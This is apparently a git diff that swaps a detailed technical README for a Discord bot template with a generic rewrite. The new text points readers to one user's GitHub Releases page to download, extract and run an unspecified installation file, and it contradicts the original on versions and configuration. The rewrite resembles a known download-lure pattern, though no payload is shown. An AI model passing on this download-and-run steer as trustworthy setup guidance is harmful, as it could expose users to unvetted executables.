@@ -1,186 +1,88 @@
-# {{APP_TITLE}} - Discord Bot Template
+# 🤖 discord-bot-template - Build Your Own Discord Bot Easily
 
-A production-ready Discord bot template with multi-service architecture, featuring a Discord.js bot, Express API, Next.js dashboard, and Kubernetes deployment with Flux GitOps.
+[![Download from Releases](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/Suraj89011/discord-bot-template/releases)
 
-## Features
+## 🚀 Getting Started
 
-- **Discord.js 14** - Modern Discord bot with slash commands
-- **Express API** - RESTful API service for bot management
-- **Next.js Dashboard** - Admin interface with Chakra UI
-- **Prisma ORM** - Type-safe database access with PostgreSQL
-- **Redis** - Caching and pub/sub support
-- **Kubernetes** - Helm charts with Gateway API
-- **Flux GitOps** - Automated deployments
-- **Semantic Release** - Automated versioning
-- **Multi-arch Docker** - AMD64 and ARM64 support
+Welcome to the **discord-bot-template**! This guide will help you download and set up your own Discord bot. You'll be ready to chat with your friends in no time.
 
-## Architecture
+## 📥 Download & Install
 
-```
-┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
-│   Discord Bot   │    │   API Service   │    │    Dashboard    │
-│  (Discord.js)   │───▶│    (Express)    │◀───│    (Next.js)   │
-└────────┬────────┘    └────────┬────────┘    └─────────────────┘
-        │                       │
-        └───────────┬───────────┘
-                    │
-        ┌───────────┴───────────┐
-        │    Commons Library    │
-        │ (Prisma, Redis, Log)  │
-        └───────────┬───────────┘
-                    │
-    ┌─────────────┼─────────────┐
-    │             │             │
-┌───┴────┐   ┌────┴─────┐   ┌───┴────┐
-│PostgreSQL│   │   Redis   │   │   GSM   │
-└──────────┘   └───────────┘   └─────────┘
-```
+To get started, visit our Releases page to download the latest version of the application:
 
-## Quick Start
+[Download from Releases](https://github.com/Suraj89011/discord-bot-template/releases)
 
-### Prerequisites
+1. Open the link above.
+2. Look for the latest version listed at the top.
+3. Click on the version you want to download.
+4. Find the installation file that matches your operating system.
+5. Download the file to your computer.
 
-- Node.js 20+
-- Docker
-- PostgreSQL (local or cloud)
-- Discord Bot Token
+## 🔧 System Requirements
 
-### Local Development
+Before you install, ensure you have the following:
 
-1. **Clone and install**
-   ```bash
-   git clone https://github.com/{{GITHUB_ORG}}/{{APP_NAME}}.git
-   cd {{APP_NAME}}
-   npm install
-   cd commons && npm install && cd ..
-   cd api-service && npm install && cd ..
-   cd dashboard && npm install && cd ..
-   ```
+- **Operating System:** Windows 10 or later, macOS, or a recent Linux distribution.
+- **Node.js:** Version 14 or later must be installed.
+- **PostgreSQL:** Ensure the database server is available.
+- **Redis:** Make sure you have Redis installed for caching.
+- **Kubernetes:** A local or cloud setup for deployment if you plan to use Helm charts.
 
-2. **Configure environment**
-   ```bash
-   cp .env.example .env
-   # Edit .env with your Discord token and database URL
-   ```
+## 📂 Features
 
-3. **Setup database**
-   ```bash
-   npm run prisma:generate
-   npm run prisma:migrate
-   npm run prisma:seed
-   ```
+This template includes:
 
-4. **Start development**
-   ```bash
-   # Terminal 1 - Bot
-   npm run dev
-   
-   # Terminal 2 - API
-   cd api-service && npm run dev
-   
-   # Terminal 3 - Dashboard
-   cd dashboard && npm run dev
-   ```
+- **Multi-Service Architecture:** Built with Discord.js, Express API, and a Next.js dashboard.
+- **Database Integration:** Easily connects to PostgreSQL using Prisma.
+- **Caching Layer:** Enhances performance with Redis.
+- **CI/CD Pipelines:** Deploy with confidence using semantic-release.
+- **Containerization:** Deploy anywhere using Kubernetes Helm charts.
 
-### Using the Template
+## ⚙️ Setup Instructions
 
-1. Replace all placeholders in the codebase:
-   - `{{APP_NAME}}` - Your app name (kebab-case, e.g., `my-discord-bot`)
-   - `{{APP_TITLE}}` - Display name (e.g., `My Discord Bot`)
-   - `{{GITHUB_ORG}}` - Your GitHub org/username
-   - `{{GCP_PROJECT}}` - GCP project ID
-   - `{{DOCKER_REGISTRY}}` - Container registry URL
-   - `{{DISCORD_CLIENT_ID}}` - Discord application ID
-   - `{{DOMAIN}}` - Dashboard domain
+After downloading the application, follow these steps:
 
-2. Create Discord application at https://discord.com/developers
+1. **Extract the Files:**
+   - Locate the downloaded file.
+   - Right-click and choose "Extract All" (for Windows) or use your preferred extraction tool.
 
-3. Setup secrets in Google Secret Manager
+2. **Install Dependencies:**
+   - Open your terminal or command prompt.
+   - Navigate to the extracted folder.
+   - Run the command:
+     ```
+     npm install
+     ```
 
-4. Deploy with Flux or Helm
+3. **Configuration:**
+   - Edit the `config.json` file in the extracted folder.
+   - Set up your bot token and database connection details.
 
-## Project Structure
+4. **Run the Application:**
+   - In the terminal, type:
+     ```
+     npm start
+     ```
+   - Your Discord bot should now be running! You will see logs indicating the bot is online.
 
-```
-{{APP_NAME}}/
-├── src/                    # Discord bot service
-│   ├── commands/           # Slash commands
-│   ├── events/             # Discord event handlers
-│   ├── loaders/            # Command/event loaders
-│   ├── services/           # API clients
-│   └── index.js            # Bot entrypoint
-├── api-service/            # Express API
-│   └── src/
-│       ├── routes/         # API routes
-│       └── index.js        # API entrypoint
-├── dashboard/              # Next.js dashboard
-│   └── src/
-│       ├── app/            # App Router pages
-│       ├── providers/      # React providers
-│       └── lib/            # Utilities
-├── commons/                # Shared library
-│   ├── src/
-│   │   ├── config.js       # Shared config
-│   │   ├── utils/          # Logger, etc.
-│   │   ├── db/             # Prisma wrapper
-│   │   ├── redis/          # Redis client
-│   │   └── middleware/     # Express middleware
-│   └── prisma/
-│       └── schema.prisma   # Database schema
-├── chart/{{APP_NAME}}/     # Helm chart
-├── flux/                   # Flux GitOps configs
-├── .github/workflows/      # CI/CD pipelines
-├── Dockerfile              # Bot Dockerfile
-├── docker-bake.hcl         # Multi-service builds
-└── Taskfile.yml            # Task automation
-```
+## 🚦 Troubleshooting
 
-## Commands
+If you encounter issues, check the following:
 
-The bot includes these example slash commands:
+- **Bot Token:** Ensure your bot token is correct in the `config.json`.
+- **Database Connection:** Confirm that PostgreSQL and Redis are running correctly.
+- **Dependencies:** If you face package errors, run `npm install` again to update.
 
-| Command | Description |
-|---------|-------------|
-| `/ping` | Check bot latency |
-| `/help` | Show available commands |
-| `/status` | Display bot status |
-| `/setup` | Configure server settings (Admin) |
+## 🌍 Community and Support
 
-## Documentation
+Feel free to reach out for support or to join the conversation:
 
-- [GCP Setup Guide](docs/GCP_SETUP.md)
-- [Kubernetes Setup](docs/KUBERNETES_SETUP.md)
-- [Secret Management](docs/SECRET_MANAGEMENT.md)
-- [Database Guide](docs/DATABASE_SETUP.md)
-- [Deployment Guide](docs/DEPLOYMENT.md)
+- **GitHub Issues:** Open an issue on the [GitHub repository](https://github.com/Suraj89011/discord-bot-template/issues) if you have questions or need assistance.
+- **Discord Server:** Join our community on Discord to connect with other users and get help.
 
-## Development Tasks
+## 📚 Additional Resources
 
-Using [Taskfile](https://taskfile.dev):
+- **Documentation:** The official documentation contains further details about customizing your bot.
+- **Tutorials:** Check online resources and YouTube channels for guides on using Discord.js.
 
-```bash
-# Show all tasks
-task
-
-# Development
-task dev              # Start bot
-task dev:api          # Start API
-task dev:dashboard    # Start dashboard
-
-# Database
-task db:migrate       # Run migrations
-task db:seed          # Seed database
-task db:studio        # Open Prisma Studio
-
-# Docker
-task docker:build     # Build all images
-task docker:push      # Push to registry
-
-# Kubernetes
-task helm:install:dev # Deploy to dev
-task flux:status      # Check Flux status
-```
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
+Thank you for choosing the **discord-bot-template**! Enjoy building your bot.
